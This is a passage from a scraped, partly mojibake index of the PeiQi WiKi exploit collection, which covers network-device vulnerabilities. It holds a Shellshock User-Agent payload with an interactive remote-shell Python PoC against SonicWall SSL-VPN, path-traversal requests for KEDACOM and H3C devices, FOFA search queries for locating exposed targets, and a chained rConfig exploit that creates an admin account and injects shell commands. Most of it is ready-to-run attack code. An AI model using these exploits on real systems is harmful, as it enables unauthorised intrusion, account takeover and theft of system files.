# Simple sanity check to see if the JAR has already been signed. # FIXME: This is not a complete check,because the original JAR signature # has to be verified completely otherwise a malicious applet # could access the local resources with SSL VPN signing it. old_sf_files=`/bin/ls ${META_INF_DIR}/*.[sS][fF] ` old_sign_files=`/bin/ls ${META_INF_DIR}/*.[rRdD][sS][aA] ` for sf_file in $old_sf_files do for sign_file in $old_sign_files do DO_SIGN=1; break done; break; done # remove all manifest info including signatures # remove all that match mf|MF|sf|SF or dsa|DSA|rsa|RSA rm -f ${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF/*.[sSmM][fF] ${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF/*.?[sS][aA] OUTPUT_JAR=\"${FULL_JAVA_SRC_PATH}\" classfiles=`/usr/bin/find ${BASE_DIR}/${WDIR}/${CLASSES_DIR} -type f` #New Manifest file MANIFEST_MAIN_ATTR=\"Manifest-Version: 1.0\\nCreated-By: 1.0 (SonicWALL Inc.)\\n\" echo -e \"Creating Manifest file ... \" echo -e ${MANIFEST_MAIN_ATTR} > ${MANIFEST} for file in $classfiles do echo $BOUNDARY echo $file echo $BOUNDARY ./jdasm $file $file #Update manifest file SHA1_MANIFEST_ENTRY_CLASS=`openssl dgst -sha1 -binary $file | openssl base64` MANIFEST_ENTRY=\"Name: ${file##${BASE_DIR}/${WDIR}/${CLASSES_DIR}/}\\nSHA1-Digest: ${SHA1_MANIFEST_ENTRY_CLASS}\\n\" echo -e ${MANIFEST_ENTRY} >> ${MANIFEST} echo $BOUNDARY done if [ ${DO_SIGN} == 1 ]; then echo -e \"Creating Manifest Signature file and Signature block\" >> $OUTLOG /usr/sbin/sw_jarsigner -m ${MANIFEST} -s ${MANIFEST_DIGEST_FILE} -S ${SIGNATURE_FILE} -c ${CODESIGNER_CRT} -k ${CODESIGNER_PVTKEY} fi rm -f ${FULL_JAVA_SRC_PATH} cd ${BASE_DIR}/${WDIR}/${CLASSES_DIR}; zip -r ${OUTPUT_JAR} * cd ${CWD} # clean rm -Rf ${BASE_DIR}/${WDIR}/${CLASSES_DIR} elif [ ${JAVA_SRC##*.} == \"class\" ]; then # if file is a class if [ ! -e ${FULL_JAVA_SRC_PATH} ];then echo \"File not found: ${FULL_JAVA_SRC_PATH}\"; exit -2; fi ./jdasm ${FULL_JAVA_SRC_PATH} ${FULL_JAVA_SRC_PATH}; fi echo \"Recursive Class Rewrite Completed.\" exit 0; è¿™ä¸ªæ–‡ä»¶å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ¼æ´è§¦å‘åœ¨ Usage-Agent å‘é€å¦‚ä¸‹è¯·æ±‚å³å¯å‘½ä»¤æ‰§è¡Œ GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd' å‘é€è¯·æ±‚ä¼šä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºå‘½ä»¤æ‰§è¡Œçš„ç»“æœ æ¼æ´åˆ©ç”¨POC import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: SonicWall SSL-VPN \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = {\"User-Agent\": \"() { :; }; echo ; /bin/bash -c '%s'\" % (cmd)} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}/cgi-bin/jarrewrite.sh \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æˆåŠŸæ‰§è¡Œ cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = {\"User-Agent\": \"() { :; }; echo ; /bin/bash -c '%s'\" % (cmd)} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ SonicWall_SSL_VPN_RCE.json å‚è€ƒæ–‡ç«  https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/KEDACOM/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/KEDACOM/","title":"KEDACOM","keywords":"","body":"KEDACOM KEDACOM æ•°å­—ç³»ç»Ÿæ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-07 14:55:32 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/KEDACOM/KEDACOMæ•°å­—ç³»ç»Ÿæ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/KEDACOM/KEDACOMæ•°å­—ç³»ç»Ÿæ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"KEDACOMæ•°å­—ç³»ç»Ÿæ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"KEDACOM æ•°å­—ç³»ç»Ÿæ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° KEDACOM æ•°å­—ç³»ç»Ÿæ¥å…¥ç½‘å…³ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ è¯·æ±‚å¯ä»¥è¯»å–æœåŠ¡å™¨ä»»æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] KEDACOM æ•°å­—ç³»ç»Ÿæ¥å…¥ç½‘å…³ FOFA [!NOTE] (app=\"KEDACOM-DVRæ¥å…¥ç½‘å…³\") && (is_honeypot=false && is_fraud=false) æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ ä½¿ç”¨POCè¯»å– /etc/hosts /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 19:25:59 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/H3C/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/H3C/","title":"H3C","keywords":"","body":"H3C H3C SecPath ä¸‹ä¸€ä»£é˜²ç«å¢™ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-04 15:16:02 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/H3C/H3C SecPath ä¸‹ä¸€ä»£é˜²ç«å¢™  ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/H3C/H3C SecPath ä¸‹ä¸€ä»£é˜²ç«å¢™  ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´.html","title":"H3C SecPath ä¸‹ä¸€ä»£é˜²ç«å¢™  ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´","keywords":"","body":"H3C SecPath ä¸‹ä¸€ä»£é˜²ç«å¢™ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ æ¼æ´æè¿° H3C SecPath ä¸‹ä¸€ä»£é˜²ç«å¢™ å­˜åœ¨åŠŸèƒ½ç‚¹å¯¼è‡´ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] H3C SecPath FOFA [!NOTE] title=\"Web user login\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å­˜åœ¨æ¼æ´ç‚¹çš„åŠŸèƒ½æœ‰ä¸¤ä¸ª ç‚¹å‡»ä¸‹è½½æŠ“åŒ…æ›´æ”¹è¯·æ±‚ å¹¶ä¸”åœ¨æœªèº«ä»½éªŒè¯çš„æƒ…å†µä¸­ï¼Œä¹Ÿå¯ä»¥è¯·æ±‚ä¸‹è½½æ•æ„Ÿæ–‡ä»¶ éªŒè¯POC /webui/?g=sys_dia_data_check&file_name=../../etc/passwd /webui/? g=sys_capture_file_download&name=../../../../../../../../etc/passwd â€‹ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-19 18:14:01 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/rConfig/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/rConfig/","title":"rConfig","keywords":"","body":"rConfigç±»ä¼¼- rConfig useradmin.inc.php ä¿¡æ¯æ³„éœ²æ¼æ´ rConfig userprocess.php ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´ rConfig ajaxArchiveFiles.php åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ rConfig ajaxEditTemplate.php åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-05 00:55:16 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/rConfig/rConfig ajaxArchiveFiles.php åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/rConfig/rConfig ajaxArchiveFiles.php åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"rConfig ajaxArchiveFiles.php åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"rConfig ajaxArchiveFiles.php åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° rConfig ajaxArchiveFiles.phpæ–‡ä»¶ä¸­ç”±äºå¯¹pathå‚æ•°å’Œextå‚æ•°è¿›è¡Œå‘½ä»¤æ‹¼æ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œè·å–æœåŠ¡å™¨æƒé™ æ¼æ´å½±å“ [!NOTE] rConfig FOFA [!NOTE] app=\"rConfig\" æ¼æ´å¤ç° å­˜åœ¨æ¼æ´çš„æ–‡ä»¶ä¸º /home/rconfig/www/lib/ajaxHandlers/ajaxArchiveFiles.php logged_in) { echo 'Don\\'t bother trying to hack me!!!!! This hack attempt has been logged'; $log->Warn(\"Security Issue: Some tried to access this file directly from IP: \" . $_SERVER['REMOTE_ADDR'] . \" & Username: \" . $session->username . \" (File: \" . $_SERVER['PHP_SELF'] . \")\"); // need to add authentication to this script header(\"Location: \" . $config_basedir . \"login.php\"); } else { //archive logs files $mainPath = $_GET['path']; $archiveMainPath = $mainPath . \"archive/\"; $ext = \"*.\" . $_GET['ext']; $fullpath = $mainPath . $ext; // create and archive dir if not already created if (!is_dir($archiveMainPath)) { mkdir(\"$archiveMainPath\"); } $today = date(\"Ymd\"); $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; exec($commandString); foreach (glob($fullpath) as $v) { unlink($v); } $fileCount = count(glob($mainPath . $ext)); if ($fileCount > 0) { $response = json_encode(array( 'failure' => true )); } else { $response = json_encode(array( 'success' => true )); } echo $response; } // end session check å…³é”®ä»£ç å¦‚ä¸‹ $mainPath = $_GET['path']; $archiveMainPath = $mainPath . \"archive/\"; $ext = \"*.\" . $_GET['ext']; $fullpath = $mainPath . $ext; // create and archive dir if not already created if (!is_dir($archiveMainPath)) { mkdir(\"$archiveMainPath\"); } $today = date(\"Ymd\"); $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; exec($commandString); $mainPathå‚æ•°å’Œ$extå‚æ•° ç”¨æˆ·å¯æ§ $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; æ²¡æœ‰ä½¿ç”¨è¿‡æ»¤ç›´æ¥æ‹¼æ¥å‘½ä»¤ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼Œå¹¶å› ä¸ºsudoè€Œrootæƒé™æ‰§è¡Œï¼Œç”±äºæ˜¯åå°æ¼æ´æ‰€ä»¥éœ€è¦ç™»å½•ï¼Œé…åˆä»»æ„ç”¨æˆ·åˆ›å»ºå¯ä»¥RCE è¯·æ±‚åŒ…ä¸º GET /lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;ls%3E../../test.txt HTTP/1.1 Host: Cookie: cookname=testtest; cookid=a13be657db5e18e453c66c564467b0f2; PHPSESSID=lr7j5r2beat1eprpklrhiorq71 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 2 å†è¯·æ±‚ http://xxx.xxx.xxx.xxx/test.txt éªŒè¯æ¼æ´ æ¼æ´POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: rConfig userprocess.php ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'testtest{}'.format(ran_number), 'password': 'testtest@{}'.format(ran_number), 'passconf': 'testtest@{}'.format(ran_number), 'email': 'testtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'test'} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: username = 'testtest{}'.format(ran_number) password = 'testtest@{}'.format(ran_number) print(\"\\033[36m[o] æˆåŠŸåˆ›å»ºè´¦æˆ· testtest{}/testtest@{} \\033[0m\".format(ran_number, ran_number)) POC_2(target_url, username, password) else: print(\"\\033[31m[x] åˆ›å»ºå¤±è´¥:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, username, password): print(\"\\033[36m[o] æ­£åœ¨ç™»é™†è´¦æˆ·..... \\033[0m\") vuln_url = target_url + \"/lib/crud/userprocess.php\" headers = { 'Content-Type': \"application/x-www-form-urlencoded; charset=UTF-8\", \"Referer\": target_url + \"deviceConnTemplates.php\", \"Origin\": target_url, \"X-Requested-With\": \"XMLHttpRequest\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = { 'user': username, 'pass': password, 'sublogin': '1' } try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨å°è¯•æ‰§è¡Œ cat /etc/passwd.....\\033[0m\") with requests.Session() as s: p = s.post(target_url + '/lib/crud/userprocess.php', data=data, verify=False) if \"Stephen Stack\" in p.text: print(\"\\033[31m[x] ç™»å½•å¤±è´¥ \\033[0m\") else: rce = s.get(target_url + '/lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;cat%20/etc/passwd%3E../../test.txt', verify=False, headers=headers) if \"success\" in rce.text: response = s.get(target_url + '/test.txt', verify=False) print(\"\\033[36m[o] æˆåŠŸæ‰§è¡Œ cat /etc/passwd, å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 20:21:11 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/rConfig/rConfig userprocess.php ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/rConfig/rConfig userprocess.php ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´.html","title":"rConfig userprocess.php ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´","keywords":"","body":"rConfig userprocess.php ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´ æ¼æ´æè¿° rConfig userprocess.php å­˜åœ¨ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´ï¼Œå‘é€ç‰¹å®šçš„è¯·æ±‚åŒ…æ”»å‡»è€…å¯ä»¥åˆ›å»ºç®¡ç†å‘˜è´¦æˆ·ç™»å½•åå° æ¼æ´å½±å“ [!NOTE] rConfig FOFA [!NOTE] app=\"rConfig\" æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º userproce.php procLogin(); } /* Admin submitted user add form */ else if (isset($_POST['add']) && isset($_POST['editid']) && empty($_POST['editid'])) { $this->procRegister(); } /* Admin submitted user edit form */ else if (isset($_POST['add']) && isset($_POST['editid']) && !empty($_POST['editid'])) { $this->procUpdateAccount(); } /* User submitted forgot password form */ else if (isset($_POST['subforgot'])) { $this->procForgotPass(); } /* User submitted edit account form */ else if (isset($_POST['subedit'])) { $this->procEditAccount(); } /** * The only other reason user should be directed here * is if he wants to logout, which means user is * logged in currently. */ else if ($session->logged_in) { $this->procLogout(); } /** * Should not get here, which means user is viewing this page * by mistake and therefore is redirected. */ else { header(\"Location: /login.php\"); } } /** * procLogin - Processes the user submitted login form, if errors * are found, the user is redirected to correct the information, * if not, the user is effectively logged in to the system. */ function procLogin() { global $session, $form; /* Login attempt */ $retval = $session->login($_POST['user'], $_POST['pass'], isset($_POST['remember'])); /* Login successful */ if ($retval) { header(\"Location: \" . $session->referrer); } /* Login failed */ else { $_SESSION['value_array'] = $_POST; $_SESSION['error_array'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer); } } /** * procLogout - Simply attempts to log the user out of the system * given that there is no logout form to process. */ function procLogout() { global $session; $retval = $session->logout(); header(\"Location: /login.php\"); } /** * procRegister - Processes the user submitted registration form, * if errors are found, the user is redirected to correct the * information, if not, the user is effectively registered with * the system and an email is (optionally) sent to the newly * created user. */ function procRegister() { global $session, $form; /* Convert username to all lowercase (by option) */ if (ALL_LOWERCASE) { $_POST['username'] = strtolower($_POST['username']); } /* Registration attempt */ $retval = $session->register($_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Registration Successful */ if ($retval == 0) { $_SESSION['reguname'] = $_POST['username']; $_SESSION['regsuccess'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully added to Database\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['reguname'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be added to Database\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } } /** * procForgotPass - Validates the given username then if * everything is fine, a new password is generated and * emailed to the address the user gave on sign up. */ function procForgotPass() { global $database, $session, $mailer, $form; /* Username error checking */ $subuser = $_POST['user']; $field = \"user\"; //Use field name for username if (!$subuser || strlen($subuser = trim($subuser)) == 0) { $form->setError($field, \"Username not entered\"); $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } else { /* Make sure username is in database */ $subuser = stripslashes($subuser); if (strlen($subuser) 30 || !preg_match(\"/^([0-9a-z])+$/\", $subuser) || (!$database->usernameTaken($subuser))) { $form->setError($field, \"Unknown Username\"); $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } } /* Errors exist, have user correct them */ if ($form->num_errors > 0) { $_SESSION['value_array'] = $_POST; $_SESSION['error_array'] = $form->getErrorArray(); } else { /* Generate new password */ $newpass = $session->generateRandStr(8); /* Get email of user */ $usrinf = $database->getUserInfo($subuser); $email = $usrinf['email']; /* Attempt to send the email with new password */ if ($mailer->sendNewPass($subuser, $email, $newpass)) { /* Email sent, update database */ $database->updateUserField($subuser, \"password\", md5($newpass)); echo \"\" . \"alert('Your new password has been generated. The password was emailed to $email');\" . \"window.close();\" . \"\"; }/* Email failure, do not change password */ else { $_SESSION['forgotpass'] = false; } } } /** * procEditAccount - Attempts to edit the user's account * information, including the password, which must be verified * before a change is made. */ function procEditAccount() { global $session, $form; /* Account edit attempt */ $retval = $session->editAccount($_POST['editid'], $_POST['username'], $_POST['curpass'], $_POST['newpass'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Account edit successful */ if ($retval == 0) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['useredit'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } } /** * procEditAccount - Attempts to edit the user's account * information, including the password, which must be verified * before a change is made. */ function procUpdateAccount() { // http or https check for url Protocol $protocol = 'http'; if (isset($_SERVER['HTTPS'])) { if (strtoupper($_SERVER['HTTPS']) == 'ON') { $protocol = 'https'; } } global $session, $form; /* Account edit attempt */ $retval = $session->updateAccount($_POST['editid'], $_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Account edit successful */ if ($retval == 0) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['useredit'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php\"); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php\"); } } } /* Initialize process */ $process = new Process; å‡ºç°æ¼æ´çš„åŸå› æ˜¯å¯¹æƒé™è®¾å®šé”™è¯¯ï¼Œä»»ä½•äººéƒ½å¯ä»¥é€šè¿‡è®¿é—®è¿™ä¸ªæ–‡ä»¶åˆ›å»ºç®¡ç†å‘˜ç”¨æˆ· å‘é€å¦‚ä¸‹è¯·æ±‚åŒ…åˆ›å»ºç®¡ç†å‘˜ç”¨æˆ· testtestï¼Œå¯†ç ä¸º testtest@123 POST /lib/crud/userprocess.php HTTP/1.1 Host: 194.149.41.11 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: multipart/form-data; boundary=b1467349fcce4aa0ae8d44439f4e06bc Upgrade-Insecure-Requests: 1 Referer: http://194.149.41.11/useradmin.php Origin: http://194.149.41.11/ Cookie: PHPSESSID=test Content-Length: 697 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"username\" testtest --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"password\" testtest@123 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"passconf\" testtest@123 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"email\" testtest@test.com --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"ulevelid\" 9 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"add\" add --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"editid\" --b1467349fcce4aa0ae8d44439f4e06bc-- æˆåŠŸåˆ›å»ºç”¨æˆ· testtestï¼Œä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•åå° æ¼æ´POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: rConfig userprocess.php ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'testtest{}'.format(ran_number), 'password': 'testtest@{}'.format(ran_number), 'passconf': 'testtest@{}'.format(ran_number), 'email': 'testtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } 